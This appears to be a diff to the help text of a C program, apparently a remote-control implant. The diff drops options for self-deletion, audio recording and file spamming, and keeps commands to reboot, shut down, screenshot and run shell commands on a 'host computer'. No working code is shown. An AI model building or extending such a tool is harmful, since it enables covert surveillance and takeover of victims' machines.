@@ -34,13 +34,9 @@ int main(int argc, char** argv)
     {
         printf(
             "\"abort\" to delete all modules from host computer.\n"
-            "\"ABORT\" to delete this entire program from host computer.\n"
             "\"reboot\" to reboot the host computer\n"
             "\"shutdown\" to power off the host computer\n"
-            "\"record start\" to start recording.\n"
-            "\"record end\" to send recorded audio file.\n"
             "\"screenshot\" to send screenshot of host computer.\n"
-            "\"3A33\" to spam files full of only ':3'\n"
             "\"cmd [commands]\" to run commands on a new shell on the host computer\n"
             "\"help\" to display this help message"
         );
